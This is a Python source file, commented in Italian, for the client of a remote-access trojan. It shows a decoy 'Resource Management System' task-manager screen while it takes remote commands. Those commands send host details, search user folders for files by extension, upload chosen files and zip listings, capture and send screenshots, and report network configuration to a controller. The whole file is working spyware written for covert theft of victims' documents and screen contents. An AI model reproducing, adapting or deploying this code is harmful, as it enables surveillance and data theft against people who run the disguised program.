from generalClient import *
from connectionClient import *
import os
import sys
import time
import psutil
import pyautogui
import traceback
import subprocess
from threading import Timer
from colorama import Fore
import zipfile

# OK mando informazioni so
def sendInfo(client):
    mando = 1
    while mando == 1:
        try:
            infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd()
            client.send((str((len(infos)))).encode(FORMAT))
            time.sleep(2)
            client.send(((infos)).encode(FORMAT))
            time.sleep(4)
            mando = 0
        except Exception:
            mando = 0
            raise Exception

# OK comportamento da trojan
def trojanBehaviour():
    while True:
        try:
            clearScreen()
            cpu =  psutil.cpu_percent()
            ram =  psutil.virtual_memory().percent
            disk = psutil.disk_usage("/").percent
            mem= psutil.swap_memory().percent
            try:
                battery= psutil.sensors_battery().percent
            except:
                battery = 0



            print(Fore.RED + "\n                               RESOURCE MANAGEMENT SYSTEM                   \n")
            print(Fore.RESET + "                   --     Task manager: Current state of usage      --\n")
            # facciamo un display a video dell'utilizzo
            print("              ------------------------------------------------------------- ")
            print(Fore.RESET + "             |"+Fore.GREEN + " CPU USAGE"+Fore.RESET+" |"+Fore.GREEN + " RAM USAGE"+Fore.RESET+" |"+Fore.GREEN + " DISK USAGE"+Fore.RESET+" |"+Fore.GREEN + " MEMORY USAGE"+Fore.RESET+" |"+Fore.GREEN + " BATTERY"+Fore.RESET+" |")
            print(Fore.RESET + "             | {:02}%       | {:02}%       | {:02}%        | {:02}%          | {:02}%     |".format(int(cpu),
                                                                                                            int(ram),
                                                                                                            int(disk),
                                                                                                            int(mem),
                                                                                                            int(battery)))
            print("              ------------------------------------------------------------- ")


            if platform.system() == "Windows":
                process = subprocess.Popen('tasklist /fi "MEMUSAGE gt 100000"', stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                           shell=True)
                timer = Timer(3, process.terminate)
                try:
                    timer.start()
                    stdout, stderr = process.communicate()
                    output = stdout or stderr
                finally:
                    timer.cancel()

                final_output = output.replace(b"\r\n", b"\n").decode(encoding="windows-1252").encode()
                time.sleep(1.5)
                print(final_output.decode('utf-8'))

            else:
                pass


            time.sleep(7)
            clearScreen()
        except:
            clearScreen()
            print("              --------------------------------------------------------- ")
            print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
            print("              --------------------------------------------------------- ")
            time.sleep()


# OK creazione file con tutti i tipi di tipologia
def filespath(tipologia, client):
    time.sleep(4)

    allType = ""
    listaType = tipologia.split()
    result = [""]
    path="null"
    counter_elemets=0

    if platform.system() == "Windows":
        path = "C:\\Users"
    elif platform.system() == "Darwin":
        path = "/Users/"
    else:
        path = "/"

    for n in range(len(listaType)):

        tipologia = listaType[n]
        result.append("\n\nLista dei risultati per estensione: " + tipologia + "\n\n")

        if tipologia[0:1]==".":
            allType=allType+" "+tipologia
            for cartella, sottocartelle, file in os.walk(path):
                for item in file:
                    if item.endswith(tipologia):
                        if item.endswith(".zip"):
                            result.append('"' + item + '"' + " nel percorso: " + cartella)
                            pathcurrent = os.getcwd()
                            os.chdir(cartella)
                            counter_elemets += 1
                            zf = zipfile.ZipFile(item, 'r')
                            os.chdir(pathcurrent)
                            for item2 in zf.namelist():
                                result.append("\n\t-:" + '"' + item2 + '"')

                            result.append("\n\n")

                        else:
                            counter_elemets += 1
                            result.append('"' + item + '"' + " nel percorso: " + cartella + "\n")

    result.append("\n----Trovati "+str(counter_elemets)+" elementi.")
    result.append("\n### TROVATI TUTTI I FILE CON ESTENSIONE " + allType + "###\n\n")
    result = ''.join(result)

    try:
        encode=result.encode(FORMAT)
        x=1024
        y=x+1024

        line = encode[0:1024]
        client.send(line)
        while (line):
            line = encode[x:y]
            client.send(line)
            x = x+1024
            y = x+1024

        time.sleep(2)
        client.send(("[END]").encode(FORMAT))

    except:
        client.send(("[ERROR]").encode(FORMAT))

    time.sleep(5)

# OK cerco tutti i file con estensione indicata in un certo path
def find(comando, client):
    time.sleep(4)
    counter_punti=0
    counter_spazi=0
    inizio_ext=0
    fine_ext=0
    inizio_path=0
    counter_elemets=0

    specificlist = ["\nRisultati "+comando+":\n"]

    for element in range(0, len(comando)):
        if comando[element] == ".":
            counter_punti += 1
            if counter_punti == 1:
                inizio_ext = element
            elif counter_punti == 2:
                inizio_path = element
        if comando[element] == " ":
            counter_spazi += 1
            if counter_spazi == 2:
                fine_ext = element
                inizio_path = element + 1

    estensione=comando[inizio_ext:fine_ext]
    path=comando[inizio_path:]
    if os.access(path, os.R_OK)==True:
        genericlist=os.listdir(path)
        for item in genericlist:
            if item.endswith(estensione):
                counter_elemets += 1
                specificlist.append("-: " + item + "\n")

        specificlist.append("\nNumero di elementi trovati: " + str(counter_elemets))
        data = ''.join(specificlist)
        try:
            filesize = sys.getsizeof(data)
            client.send((str(filesize)).encode(FORMAT))
            time.sleep(5)
            client.send((data).encode(FORMAT))
            time.sleep(1)
        except Exception:
            traceback.print_exc()
            raise Exception
    else:
        client.send(("[ERROR] Path doesn't exist").encode(FORMAT))


def download(comando, client):

    counter_virgolette = 0
    counter_spazi = 0
    inizio_file = 0
    fine_file = 0
    inizio_path = 0
    file = 'null'
    path = 'null'
    regex_match = 'null'

    regex_match = regexcheck_download(comando)

    if regex_match != 'null' and regex_match != 'not matched':
        if regex_match == 'windowstip1' or regex_match == 'unixtip1':
            # tipologia 1: (simile a find) download "nomefile.estensione" path
            for element in range(0, len(comando)):
                if comando[element] == "\"":
                    counter_virgolette += 1
                    if counter_virgolette == 1:
                        inizio_file = element + 1
                    elif counter_virgolette == 2:
                        fine_file = element
                if comando[element] == " ":
                    counter_spazi += 1
                    if counter_spazi >= 2 and counter_virgolette == 2:
                        inizio_path = element + 1
                        break
        elif regex_match == 'windowstip2' or regex_match == 'unixtip2':
            # tipologia 2: (il risultato di filespath) "Carta di identità cartacea titolare.pdf" nel percorso: /Users/erasmo/Desktop
            for element in range(0, len(comando)):
                if comando[element] == "\"":
                    counter_virgolette += 1
                    if counter_virgolette == 1:
                        inizio_file = element + 1
                    elif counter_virgolette == 2:
                        fine_file = element
                if comando[element] == ":" and counter_virgolette == 2:
                    inizio_path = element + 2
                    break

        file = comando[inizio_file:fine_file]
        path = comando[inizio_path:]

        # distinguere il tipo di path per utilizzare os.path.getsize
        pathtoremember = 'null'
        if path == ".":
            path = os.getcwd()
        elif path == "..":
            pathtoremember = os.getcwd()
            os.chdir("..")
            path = os.getcwd()
        elif path.startswith(".\\") or path.startswith("./"):
            pathtoremember = os.getcwd()
            os.chdir(os.getcwd() + path[1:])
            path = os.getcwd()
        elif path.startswith("C:\\") or path.startswith("\\") or path.startswith("/"):
            pathtoremember = os.getcwd()
            os.chdir(path)
            path = os.getcwd()
        else:
            client.send(("[ERROR]").encode(FORMAT))

        filetrovato = False

        if path != 'null' and file != 'null':
            for root, dir, files in os.walk(path):
                if file in files:
                    filetrovato = True
                    break

        # esegui procedura di download
        if filetrovato:
            try:
                filesize = os.path.getsize(file)

                if filesize <= 0:
                    raise Exception
                else:
                    with open(file, 'rb') as f:
                        time.sleep(4)
                        line = f.read(1024)
                        client.send(line)
                        while (line):
                            line = f.read(1024)
                            client.send(line)

                        f.close()
                        time.sleep(2)
                        client.send(("[END]").encode(FORMAT))
            except:
                client.send(("[ERROR]").encode(FORMAT))

        # ritorno al path precedente nel caso fosse stato cambiato
        if pathtoremember != 'null':
            os.chdir(pathtoremember)


#aprire i file
def openZip(comando,client):
    result=[]
    if comando.endswith(".zip\""):
        try:
            nomeFile = comando[6:(len(comando)-1)]
            result.append(f"\n {nomeFile} contiene i seguenti file:\n ")
            zf = zipfile.ZipFile(nomeFile, 'r')
            for item2 in zf.namelist():
                result.append("\n\t-:" + '"' + item2 + '"')

            result = ''.join(result)

            try:
                encode = result.encode(FORMAT)
                x = 1024
                y = x + 1024

                line = encode[0:1024]
                client.send(line)
                while (line):
                    line = encode[x:y]
                    client.send(line)
                    x = x + 1024
                    y = x + 1024

                time.sleep(2)
                client.send(("[END]").encode(FORMAT))
            except:
                raise Exception
        except:
            client.send(("[ERROR]").encode(FORMAT))

        time.sleep(5)


# funzione di remote control
def openRemoteControl(client):
    comando = "null"
    while comando != "exit":
        try:
            pathSend="[PATH]"+os.getcwd()
            client.send((pathSend).encode(FORMAT))
            comando = client.recv(1024).decode(FORMAT)
            time.sleep(0.5)

            if comando[0:2] == "cd":
                match= regexcheck_cd(comando)

                if match:
                    os.chdir(comando[3:])

            elif comando[0:2] == "ls":
                match=False
                match=regexcheck_ls(comando)
                try:
                    if match:
                        if len(comando) == 2:
                            listdir = os.listdir()
                            lista = []
                            for item in listdir:
                                lista.append("-: " + item + "\n")

                            data = ''.join(lista)
                            client.send((data).encode(FORMAT))
                            time.sleep(1.5)
                        else:
                            comandorisolto = comando.split()
                            path = comandorisolto[1]
                            listdir = os.listdir(path)
                            lista = []
                            for item in listdir:
                                lista.append("-: " + item + "\n")

                            data = ''.join(lista)
                            client.send((data).encode(FORMAT))
                            time.sleep(1.5)
                except:
                    client.send(("[ERROR]").encode(FORMAT))

            elif comando[0:4] == "rete" or comando[0:7] == "network":
                try:
                    if platform.system() == "Windows":
                        try:
                            data = subprocess.check_output(['ipconfig', '/all']).decode('utf-8')
                        except:
                            data = subprocess.check_output(['ipconfig']).decode('utf-8')

                        result = ["### Dati configurazione di rete ###\n"]
                        for item in data:
                            result.append(item)

                        result = ''.join(result)
                        client.send(((result)).encode())
                        time.sleep(1.5)

                    elif platform.system() == "Darwin" or "Linux":
                        try:
                            data = subprocess.check_output(['ifconfig', '-a']).decode('utf-8')
                        except:
                            data = subprocess.check_output(['ifconfig']).decode('utf-8')

                        result = ["### Dati configurazione di rete ###\n"]
                        for item in data:
                            result.append(item)

                        result = ''.join(result)
                        client.send(((result)).encode())
                        time.sleep(1.5)

                except Exception:
                    traceback.print_exc()
                    client.send(("[ERROR]").encode(FORMAT))

            elif comando == "pwd":
                client.send((os.getcwd()).encode(FORMAT))

            elif comando[0:9] == "filespath":
                reg = "^filespath( \.[a-z]{1,4})+"
                if(re.match(reg, comando)):
                    try:
                        estensione = comando[10:]
                        filespath(estensione, client)
                    except:
                        pass
                else:
                    pass

            elif comando[0:4] == "find":
                if regexcheck_find(comando) == True:
                    try:
                        find(comando, client)
                        time.sleep(2)
                    except:
                        traceback.print_exc()

            elif comando == "info":
                infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd() + "\n"
                client.send(((infos)).encode(FORMAT))


            elif comando[0:8] == "download":
                download(comando,client)
                time.sleep(3)

            elif comando =="screenshot":
                myScreenshot = pyautogui.screenshot()
                if platform.system() == "Windows":
                    myScreenshot.save(os.getcwd() + "\screen.png")
                elif platform.system() == "Darwin":
                    myScreenshot.save(os.getcwd() + "/screen.png")
                else:
                    myScreenshot.save(os.getcwd() + "/screen.png")

                try:
                    filename = "screen.png"
                    filesize = os.path.getsize(filename)
                    if filesize<=0:
                        raise Exception
                    else:
                        with open(filename, 'rb') as f:
                            time.sleep(4)
                            line = f.read(1024)
                            client.send(line)
                            while(line):
                                line = f.read(1024)
                                client.send(line)

                            time.sleep(2)
                            f.close()
                            client.send(("[END]").encode(FORMAT))
                            time.sleep(3)
                except:
                    traceback.print_exc()
                    client.send(("[ERROR]").encode(FORMAT))

                os.remove("screen.png")
                time.sleep(5)

            elif comando[0:4]=="open":
                regex = r'^open \"[a-zA-Z0-9, ,\_,\-,\.,\']+\.zip\"'
                if re.match(regex, comando):
                    openZip(comando,client)
                else:
                    pass

            else:
                pass

        except Exception as e:
            #traceback.print_exc()
            if e.__class__.__name__== "ConnectionResetError":
                comando="exit"
            else:
                comando="null"
